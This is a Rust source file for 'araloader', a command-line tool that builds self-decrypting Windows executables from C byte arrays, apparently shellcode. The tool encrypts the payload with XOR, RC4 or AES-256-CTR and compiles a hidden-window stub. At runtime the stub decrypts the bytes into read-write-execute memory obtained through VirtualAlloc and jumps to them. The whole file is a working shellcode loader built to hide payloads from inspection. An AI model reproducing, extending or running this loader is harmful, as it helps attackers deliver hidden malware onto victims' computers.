use clap::{Parser, ValueEnum};
use regex::Regex;
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;
use rand::Rng;

use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
use aes::Aes256;

#[derive(Debug, Clone, ValueEnum)]
enum EncryptionMode {
    Xor,
    Rc4,
    Aes,
}

#[derive(Parser, Debug)]
#[command(name = "araloader")]
#[command(about = "Build self-decrypting Windows executables from C byte arrays, or extract binaries to C arrays")]
struct Args {
    /// Input file containing C byte array or binary (with --extract)
    #[arg(short, long)]
    input: PathBuf,

    /// Output file path
    #[arg(short, long, default_value = "output.exe")]
    output: PathBuf,

    /// Encryption mode: xor, rc4, or aes
    #[arg(short, long, value_enum, default_value = "rc4")]
    encrypt: EncryptionMode,

    /// Encryption key (if not provided, random key is generated)
    #[arg(short, long)]
    key: Option<String>,

    /// Output encryption key to file
    #[arg(long)]
    keyfile: Option<PathBuf>,

    /// Extract binary file to C byte array (disable encryption)
    #[arg(long)]
    extract: bool,
}

fn main() {
    let args = Args::parse();

    // Extract mode: convert binary file to C array
    if args.extract {
        let binary_data = fs::read(&args.input).expect("Failed to read binary input file");
        let c_array = bytes_to_c_array(&binary_data);
        fs::write(&args.output, c_array).expect("Failed to write output file");
        println!("[+] Extracted {} bytes from {}", binary_data.len(), args.input.display());
        println!("[+] C array saved to: {}", args.output.display());
        return;
    }

    // Build mode: create self-decrypting executable
    let content = fs::read_to_string(&args.input).expect("Failed to read input file");

    // Extract byte array data
    let bytes = extract_bytes(&content).expect("Failed to extract byte array");
    let original_size = bytes.len();

    // Encrypt data
    let (encrypted_bytes, key) = match args.encrypt {
        EncryptionMode::Xor => {
            let key = args.key.unwrap_or_else(generate_random_key);
            let encrypted = xor_encrypt(&bytes, &key);
            println!("[+] XOR encrypted with key: {}", key);
            (encrypted, key)
        }
        EncryptionMode::Rc4 => {
            let key = args.key.unwrap_or_else(generate_random_key);
            let encrypted = rc4_encrypt(&bytes, &key);
            println!("[+] RC4 encrypted with key: {}", key);
            (encrypted, key)
        }
        EncryptionMode::Aes => {
            let raw_key = args.key.unwrap_or_else(generate_random_key);
            let key_bytes = aes_key_bytes(&raw_key);
            let key = hex::encode(&key_bytes);
            let encrypted = aes_ctr_encrypt(&bytes, &key_bytes);
            println!("[+] AES-256-CTR encrypted with key: {}", key);
            (encrypted, key)
        }
    };

    // Generate Rust stub with embedded encrypted data
    let rust_code = generate_stub(&encrypted_bytes, &key, &args.encrypt);

    // Compile with rustc
    println!("[*] Compiling self-decrypting stub...");

    let mut child = Command::new("rustc")
        .arg("--edition")
        .arg("2021")
        .arg("--target")
        .arg("x86_64-pc-windows-gnu")
        .arg("-O")
        .arg("-C")
        .arg("opt-level=3")
        .arg("-C")
        .arg("link-arg=-static-libgcc")
        .arg("-C")
        .arg("link-arg=-mwindows")
        .arg("-")
        .arg("-o")
        .arg(&args.output)
        .stdin(std::process::Stdio::piped())
        .spawn()
        .expect("Failed to spawn rustc");

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(rust_code.as_bytes()).expect("Failed to write to rustc stdin");
    }

    let output = child.wait_with_output().expect("Failed to wait on rustc");

    if !output.status.success() {
        eprintln!("Compilation failed!");
        eprintln!("{}", String::from_utf8_lossy(&output.stderr));
        return;
    }

    println!("[+] Original data: {} bytes", original_size);
    println!("[+] Encrypted: {} bytes", encrypted_bytes.len());
    println!("[+] Final executable: {}", args.output.display());

    // Save key if requested
    if let Some(keyfile) = &args.keyfile {
        fs::write(&keyfile, &key).expect("Failed to write key file");
        println!("[+] Key saved to: {}", keyfile.display());
    }

    println!("\n[+] Ready to run: {}", args.output.display());
}

fn extract_bytes(content: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let re = Regex::new(r#"\\x([0-9a-fA-F]{2})"#)?;
    let mut bytes = Vec::new();

    for cap in re.captures_iter(content) {
        let hex_str = &cap[1];
        let byte = u8::from_str_radix(hex_str, 16)?;
        bytes.push(byte);
    }

    if bytes.is_empty() {
        return Err("No byte array found in input file".into());
    }

    Ok(bytes)
}

fn bytes_to_c_array(bytes: &[u8]) -> String {
    let mut result = String::from("unsigned char buf[] = \n\"");
    let mut line = String::new();

    for (i, byte) in bytes.iter().enumerate() {
        if i > 0 && i % 16 == 0 {
            result.push_str(&line);
            result.push_str("\"\n\"");
            line.clear();
        }
        line.push_str(&format!("\\x{:02x}", byte));
    }

    if !line.is_empty() {
        result.push_str(&line);
    }
    result.push_str("\";");

    result
}

fn generate_random_key() -> String {
    let random_bytes: [u8; 32] = rand::thread_rng().gen();
    hex::encode(random_bytes)
}

fn aes_key_bytes(key_hex: &str) -> Vec<u8> {
    if let Ok(bytes) = hex::decode(key_hex) {
        if bytes.len() == 32 {
            return bytes;
        }
    }
    let mut k = key_hex.as_bytes().to_vec();
    k.resize(32, 0);
    k
}

fn xor_encrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key_bytes[i % key_bytes.len()])
        .collect()
}

fn rc4_encrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    let mut s: Vec<u8> = (0..=255).collect();

    // KSA (Key Scheduling Algorithm)
    let mut j = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key_bytes[i % key_bytes.len()] as usize) & 0xff;
        s.swap(i, j);
    }

    // PRGA (Pseudo-Random Generation Algorithm)
    let mut i = 0;
    let mut j = 0;
    data.iter()
        .map(|byte| {
            i = (i + 1) & 0xff;
            j = (j + s[i] as usize) & 0xff;
            s.swap(i, j);
            let k = s[(s[i] as usize + s[j] as usize) & 0xff] as u8;
            byte ^ k
        })
        .collect()
}

fn aes_ctr_encrypt(data: &[u8], key_bytes: &[u8]) -> Vec<u8> {
    let cipher = Aes256::new_from_slice(key_bytes).expect("AES-256 requires 32-byte key");

    let nonce: [u8; 8] = rand::thread_rng().gen();
    let mut result = nonce.to_vec();
    let mut counter: u64 = 0;

    for chunk in data.chunks(16) {
        let mut block_arr: [u8; 16] = [0; 16];
        block_arr[..8].copy_from_slice(&nonce);
        block_arr[8..].copy_from_slice(&counter.to_be_bytes());

        let mut block = GenericArray::clone_from_slice(&block_arr);
        cipher.encrypt_block(&mut block);

        for (i, &byte) in chunk.iter().enumerate() {
            result.push(byte ^ block[i]);
        }
        counter += 1;
    }

    result
}

// ── Stub template pieces ─────────────────────────────────────────────

const STUB_PREFIX: &str = r#"
#![windows_subsystem = "windows"]

#[cfg(target_os = "windows")]
mod windows_ffi {
    #[link(name = "kernel32")]
    extern "system" {
        pub fn VirtualAlloc(
            lpAddress: *mut std::ffi::c_void,
            dwSize: usize,
            flAllocationType: u32,
            flProtect: u32,
        ) -> *mut std::ffi::c_void;
    }
}

fn base64_decode(s: &str) -> Vec<u8> {
    let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = Vec::new();
    let mut acc = 0u32;
    let mut bits = 0;

    for c in s.chars() {
        if c == '=' { break; }
        if let Some(idx) = alphabet.find(c) {
            acc = (acc << 6) | (idx as u32);
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                result.push((acc >> bits) as u8);
                acc &= (1 << bits) - 1;
            }
        }
    }
    result
}

#[allow(dead_code)]
fn hex_decode(s: &str) -> Vec<u8> {
    let s = s.as_bytes();
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut i = 0;
    while i < s.len() {
        let hi = match s[i] { b'0'..=b'9' => s[i] - b'0', b'a'..=b'f' => s[i] - b'a' + 10, b'A'..=b'F' => s[i] - b'A' + 10, _ => 0 };
        let lo = match s[i+1] { b'0'..=b'9' => s[i+1] - b'0', b'a'..=b'f' => s[i+1] - b'a' + 10, b'A'..=b'F' => s[i+1] - b'A' + 10, _ => 0 };
        out.push((hi << 4) | lo);
        i += 2;
    }
    out
}
"#;

const XOR_DECRYPTOR: &str = r#"
#[allow(dead_code)]
fn xor_decrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key_bytes[i % key_bytes.len()])
        .collect()
}
"#;

const RC4_DECRYPTOR: &str = r#"
#[allow(dead_code)]
fn rc4_decrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j = 0;

    for i in 0..256 {
        j = (j + s[i] as usize + key_bytes[i % key_bytes.len()] as usize) & 0xff;
        s.swap(i, j);
    }

    let mut i = 0;
    let mut j = 0;
    data.iter()
        .map(|byte| {
            i = (i + 1) & 0xff;
            j = (j + s[i] as usize) & 0xff;
            s.swap(i, j);
            let k = s[(s[i] as usize + s[j] as usize) & 0xff] as u8;
            byte ^ k
        })
        .collect()
}
"#;

const AES_DECRYPTOR: &str = r#"
#[allow(dead_code, non_snake_case)]
fn aes_ctr_decrypt(data: &[u8], key: &str) -> Vec<u8> {
    static SBOX: [u8; 256] = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ];

    fn gmul(a: u8, b: u8) -> u8 {
        let mut p: u8 = 0;
        let mut aa = a;
        let mut bb = b;
        for _ in 0..8 {
            if bb & 1 != 0 { p ^= aa; }
            let hi = aa & 0x80;
            aa <<= 1;
            if hi != 0 { aa ^= 0x1b; }
            bb >>= 1;
        }
        p
    }

    fn aes256_key_expansion(key: &[u8; 32]) -> [[u8; 16]; 15] {
        let mut rk = [[0u8; 16]; 15];
        let mut w: [u32; 60] = [0; 60];

        for i in 0..8 {
            w[i] = ((key[4*i] as u32) << 24)
                 | ((key[4*i+1] as u32) << 16)
                 | ((key[4*i+2] as u32) << 8)
                 | (key[4*i+3] as u32);
        }

        for i in 8..60 {
            let mut temp = w[i-1];
            if i % 8 == 0 {
                temp = (temp << 8) | (temp >> 24);
                temp = ((SBOX[(temp >> 24) as usize] as u32) << 24)
                     | ((SBOX[((temp >> 16) & 0xff) as usize] as u32) << 16)
                     | ((SBOX[((temp >> 8) & 0xff) as usize] as u32) << 8)
                     | (SBOX[(temp & 0xff) as usize] as u32);
                let rcon = match i / 8 {
                    1 => 0x01000000, 2 => 0x02000000, 3 => 0x04000000,
                    4 => 0x08000000, 5 => 0x10000000, 6 => 0x20000000,
                    7 => 0x40000000, _ => 0,
                };
                temp ^= rcon;
            } else if i % 8 == 4 {
                temp = ((SBOX[(temp >> 24) as usize] as u32) << 24)
                     | ((SBOX[((temp >> 16) & 0xff) as usize] as u32) << 16)
                     | ((SBOX[((temp >> 8) & 0xff) as usize] as u32) << 8)
                     | (SBOX[(temp & 0xff) as usize] as u32);
            }
            w[i] = w[i-8] ^ temp;
        }

        for r in 0..15 {
            for c in 0..4 {
                let val = w[r*4 + c];
                rk[r][c*4]   = (val >> 24) as u8;
                rk[r][c*4+1] = ((val >> 16) & 0xff) as u8;
                rk[r][c*4+2] = ((val >> 8) & 0xff) as u8;
                rk[r][c*4+3] = (val & 0xff) as u8;
            }
        }
        rk
    }

    fn aes256_encrypt_block(block: &mut [u8; 16], rk: &[[u8; 16]; 15]) {
        for i in 0..16 { block[i] ^= rk[0][i]; }

        for round in 1..14 {
            for i in 0..16 { block[i] = SBOX[block[i] as usize]; }
            let t = block[1]; block[1]=block[5]; block[5]=block[9]; block[9]=block[13]; block[13]=t;
            let t0=block[2]; let t1=block[6]; block[2]=block[10]; block[6]=block[14]; block[10]=t0; block[14]=t1;
            let t=block[15]; block[15]=block[11]; block[11]=block[7]; block[7]=block[3]; block[3]=t;
            for c in 0..4 {
                let i = c*4;
                let a0=block[i]; let a1=block[i+1]; let a2=block[i+2]; let a3=block[i+3];
                block[i]   = gmul(2,a0)^gmul(3,a1)^a2^a3;
                block[i+1] = a0^gmul(2,a1)^gmul(3,a2)^a3;
                block[i+2] = a0^a1^gmul(2,a2)^gmul(3,a3);
                block[i+3] = gmul(3,a0)^a1^a2^gmul(2,a3);
            }
            for i in 0..16 { block[i] ^= rk[round][i]; }
        }

        for i in 0..16 { block[i] = SBOX[block[i] as usize]; }
        let t = block[1]; block[1]=block[5]; block[5]=block[9]; block[9]=block[13]; block[13]=t;
        let t0=block[2]; let t1=block[6]; block[2]=block[10]; block[6]=block[14]; block[10]=t0; block[14]=t1;
        let t=block[15]; block[15]=block[11]; block[11]=block[7]; block[7]=block[3]; block[3]=t;
        for i in 0..16 { block[i] ^= rk[14][i]; }
    }

    let key_bytes = hex_decode(key);
    let mut key_arr: [u8; 32] = [0; 32];
    key_arr.copy_from_slice(&key_bytes[..32]);
    let rk = aes256_key_expansion(&key_arr);

    let mut nonce = [0u8; 8];
    nonce.copy_from_slice(&data[..8]);
    let ct = &data[8..];

    let mut result = Vec::with_capacity(ct.len());
    let mut counter: u64 = 0;

    for chunk in ct.chunks(16) {
        let mut block: [u8; 16] = [0; 16];
        block[..8].copy_from_slice(&nonce);
        block[8..].copy_from_slice(&counter.to_be_bytes());
        aes256_encrypt_block(&mut block, &rk);
        for (i, &byte) in chunk.iter().enumerate() {
            result.push(byte ^ block[i]);
        }
        counter += 1;
    }

    result
}
"#;

const STUB_MAIN: &str = r#"
#[cfg(target_os = "windows")]
fn main() {{
    use windows_ffi::*;

    let encrypted_b64 = "{b64}";
    let encrypted = base64_decode(encrypted_b64);
    let key = "{key}";
    let decrypted = {fn_name}(&encrypted, key);

    unsafe {{
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_RESERVE: u32 = 0x2000;
        const PAGE_EXECUTE_READWRITE: u32 = 0x40;

        let size = decrypted.len();
        let ptr = VirtualAlloc(
            std::ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if !ptr.is_null() {{
            std::ptr::copy_nonoverlapping(
                decrypted.as_ptr(),
                ptr as *mut u8,
                size,
            );

            let code_fn: extern "system" fn() = std::mem::transmute(ptr);
            code_fn();
        }}
    }}
}}

#[cfg(not(target_os = "windows"))]
fn main() {{}}
"#;

fn generate_stub(encrypted_data: &[u8], key: &str, mode: &EncryptionMode) -> String {
    let b64_data = base64_encode(encrypted_data);

    let mut stub = String::new();
    stub.push_str(STUB_PREFIX);

    let decryptor_fn = match mode {
        EncryptionMode::Xor => {
            stub.push_str(XOR_DECRYPTOR);
            "xor_decrypt"
        }
        EncryptionMode::Rc4 => {
            stub.push_str(RC4_DECRYPTOR);
            "rc4_decrypt"
        }
        EncryptionMode::Aes => {
            stub.push_str(AES_DECRYPTOR);
            "aes_ctr_decrypt"
        }
    };

    stub.push_str(&STUB_MAIN
        .replace("{b64}", &b64_data)
        .replace("{key}", key)
        .replace("{fn_name}", decryptor_fn));

    stub
}

fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    let mut i = 0;

    while i < data.len() {
        let b1 = data[i];
        let b2 = if i + 1 < data.len() { data[i + 1] } else { 0 };
        let b3 = if i + 2 < data.len() { data[i + 2] } else { 0 };

        result.push(ALPHABET[(b1 >> 2) as usize] as char);
        result.push(ALPHABET[(((b1 & 0x03) << 4) | (b2 >> 4)) as usize] as char);

        if i + 1 < data.len() {
            result.push(ALPHABET[(((b2 & 0x0f) << 2) | (b3 >> 6)) as usize] as char);
        } else {
            result.push('=');
        }

        if i + 2 < data.len() {
            result.push(ALPHABET[(b3 & 0x3f) as usize] as char);
        } else {
            result.push('=');
        }

        i += 3;
    }

    result
}
